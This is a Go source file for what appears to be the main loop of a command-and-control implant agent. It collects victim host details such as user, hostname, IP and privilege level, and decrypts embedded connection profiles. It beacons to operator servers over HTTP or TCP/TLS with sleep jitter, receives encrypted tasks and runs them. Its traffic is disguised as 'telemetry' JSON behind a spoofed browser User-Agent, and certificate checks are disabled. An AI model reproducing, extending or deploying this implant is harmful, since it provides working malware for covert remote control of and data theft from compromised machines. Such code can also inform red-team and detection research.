package main

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"gopher/functions"
	"gopher/utils"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true

// JSON Wrapper for Traffic Shaping
type TelemetryPacket struct {
	Timestamp int64  `json:"timestamp"`
	Status    string `json:"status"`
	Payload   string `json:"trace_id"`
}

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := utils.SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Acp:        acp,
		Oem:        oemcp,
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profiles []utils.Profile
var encKeys [][]byte
var profileIndex int
var profile utils.Profile
var AgentId uint32
var encKey []byte

// Helper to calculate sleep with jitter
func getSleepTime(sleep int, jitter int) time.Duration {
	if jitter <= 0 {
		return time.Duration(sleep) * time.Second
	}
	// Simple jitter implementation: sleep +/- (sleep * jitter / 100)
	// Or just Random(sleep, sleep + jitter)
	// Let's use: sleep + random(0, jitter_seconds)
	// Usually jitter is a percentage.
	// Let's assume jitter is percentage (0-100).
	base := float64(sleep)
	diff := base * (float64(jitter) / 100.0)

	// Generate random offset
	r, _ := rand.Int(rand.Reader, big.NewInt(100))
	factor := float64(r.Int64()) / 100.0 // 0.0 to 1.0

	// Apply jitter: sleep - diff + (2 * diff * factor)  => range [sleep-diff, sleep+diff]
	finalSleep := base - diff + (2 * diff * factor)
	if finalSleep < 0 {
		finalSleep = 0
	}

	return time.Duration(finalSleep * float64(time.Second))
}

func sendDataHttp(urlStr string, encryptedData []byte) ([]byte, error) {
	// 1. Wrap in JSON
	payload := utils.Obfuscate(encryptedData)
	packet := TelemetryPacket{
		Timestamp: time.Now().Unix(),
		Status:    "active",
		Payload:   payload,
	}
	jsonBytes, err := json.Marshal(packet)
	if err != nil {
		return nil, err
	}

	// 2. Create Request
	req, err := http.NewRequest("POST", urlStr, bytes.NewBuffer(jsonBytes))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json")
	if profile.UserAgent != "" {
		req.Header.Set("User-Agent", profile.UserAgent)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")
	}

	if profile.HeaderName != "" && AgentId != 0 {
		// Encrypt Agent ID using Listener Key (encKey)
		idBuf := make([]byte, 4)
		binary.BigEndian.PutUint32(idBuf, AgentId)

		// Use encKey (global Listener Key)
		encId, err := utils.EncryptData(idBuf, encKey)
		if err == nil {
			headerVal := base64.StdEncoding.EncodeToString(encId)
			req.Header.Set(profile.HeaderName, headerVal)
			// fmt.Printf("[AGENT DEBUG] Header Set: %s = %s\n", profile.HeaderName, headerVal)
		}
	}

	// 3. Configure Client (SSL)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if profile.UseSSL {
		// If CaCert provided, use it, but keeping it simple with InsecureSkipVerify for now
		transport.TLSClientConfig.InsecureSkipVerify = true
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	// 4. Send
	resp, err := client.Do(req)
	if err != nil {
		// fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		// fmt.Printf("[AGENT DEBUG] Server returned status: %d\n", resp.StatusCode)
		return nil, fmt.Errorf("server returned status: %d", resp.StatusCode)
	}

	// 5. Read Response
	// Assuming Listener responds with JSON containing "data" or raw body.
	// For this prototype, we just read raw body.
	return io.ReadAll(resp.Body)
}

func main() {

	for _, encProfileHex := range encProfiles {
		// Decode Hex Profile
		encProfile, err := hex.DecodeString(encProfileHex)
		if err != nil {
			fmt.Println("Hex Decode Error")
			continue
		}

		key := make([]byte, 16)
		copy(key, encProfile[:16])

		// fmt.Printf("[AGENT DEBUG] Loaded Key: %x\n", key)

		encData := encProfile[16:]
		decData, err := utils.DecryptData(encData, key)
		if err != nil {
			fmt.Println("Profile Decrypt Error")
			continue
		}

		var p utils.Profile
		err = msgpack.Unmarshal(decData, &p)
		if err != nil {
			fmt.Println("MsgPack Unmarshal Error")
			continue
		}

		profiles = append(profiles, p)
		encKeys = append(encKeys, key)
	}

	if len(profiles) == 0 {
		return
	}

	profileIndex = 0
	profile = profiles[profileIndex]
	encKey = encKeys[profileIndex]

	sessionInfo, sessionKey := CreateInfo()
	utils.SKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	// Prepare Init Packet
	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
	initMsg, _ = utils.EncryptData(initMsg, encKey)

	// fmt.Printf("[AGENT DEBUG] Init Packet (Hex): %s\n", hex.EncodeToString(initMsg))

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	addrIndex := 0

	// If Uri is set, use HTTP mode
	isHttp := profile.Uri != ""

	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex++
			if addrIndex >= len(profile.Addresses) {
				addrIndex = 0
				profileIndex = (profileIndex + 1) % len(profiles)
				profile = profiles[profileIndex]
				encKey = encKeys[profileIndex]

				// Re-prepare init packet for new profile
				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
				initMsg, _ = utils.EncryptData(initMsg, encKey)

				isHttp = profile.Uri != ""
			}
		}

		// ==========================
		// HTTP MODE
		// ==========================
		if isHttp {
			targetUrl := ""
			scheme := "http"
			if profile.UseSSL {
				scheme = "https"
			}
			// Construct URL: scheme://address/uri
			targetUrl = fmt.Sprintf("%s://%s%s", scheme, profile.Addresses[addrIndex], profile.Uri)

			// 1. Send Init
			_, err := sendDataHttp(targetUrl, initMsg)
			if err != nil {
				continue // Try next address
			}

			// 2. Polling Loop
			// fmt.Printf("[AGENT DEBUG] Entering Polling Loop. Target: %s\n", targetUrl)

			// Initial Heartbeat
			outMessage := utils.Message{Type: 0}

			for ACTIVE {
				// Prepare Data to send (Task Outputs)
				sendData, _ := msgpack.Marshal(outMessage)
				encData, _ := utils.EncryptData(sendData, utils.SKey)

				// Reset outMessage to Heartbeat for next loop
				outMessage = utils.Message{Type: 0}

				// Send and Receive
				respData, err := sendDataHttp(targetUrl, encData)
				if err != nil {
					// fmt.Printf("[AGENT DEBUG] Request Failed: %v\n", err)
					break // Connection broken, try next address
				}

				// Process Response (Tasks)
				if len(respData) > 0 {
					var packet TelemetryPacket
					if err := json.Unmarshal(respData, &packet); err == nil && len(packet.Payload) > 0 {
						// Deobfuscate
						encTask, err := utils.Deobfuscate(packet.Payload)
						if err == nil {
							// Decrypt with Session Key
							taskBytes, err := utils.DecryptData(encTask, utils.SKey)
							if err == nil {
								var inMsg utils.Message
								if err := msgpack.Unmarshal(taskBytes, &inMsg); err == nil {
									// Execute Task
									if inMsg.Type == 1 {
										outMessage.Type = 1
										outMessage.Object = TaskProcess(inMsg.Object)
									}
								}
							}
						}
					}
				}

				// Check for active downloads if no other tasks are pending
				if outMessage.Type == 0 {
					downloadData := ProcessDownloads()
					if len(downloadData) > 0 {
						outMessage.Type = 2
						outMessage.Object = downloadData
					}
				}

				// Sleep
				sleepTime := getSleepTime(profile.Sleep, profile.Jitter)
				// fmt.Printf("[AGENT DEBUG] Sleeping for %v\n", sleepTime)
				if sleepTime < time.Second {
					sleepTime = time.Second
				}
				time.Sleep(sleepTime)
			}

			continue
		}

		// ==========================
		// TCP MODE (Original Logic)
		// ==========================

		var (
			err  error
			conn net.Conn
		)

		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				continue
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
		if err != nil {
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				continue
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, initMsg)

		/// Recv Command

		var (
			inMessage  utils.Message
			outMessage utils.Message
			recvData   []byte
			sendData   []byte
		)

		for ACTIVE {
			recvData, err = functions.RecvMsg(conn)
			if err != nil {
				break
			}

			outMessage = utils.Message{Type: 0}
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ = msgpack.Marshal(outMessage)
			sendData, _ = utils.EncryptData(sendData, sessionKey)
			_ = functions.SendMsg(conn, sendData)
		}
	}
}
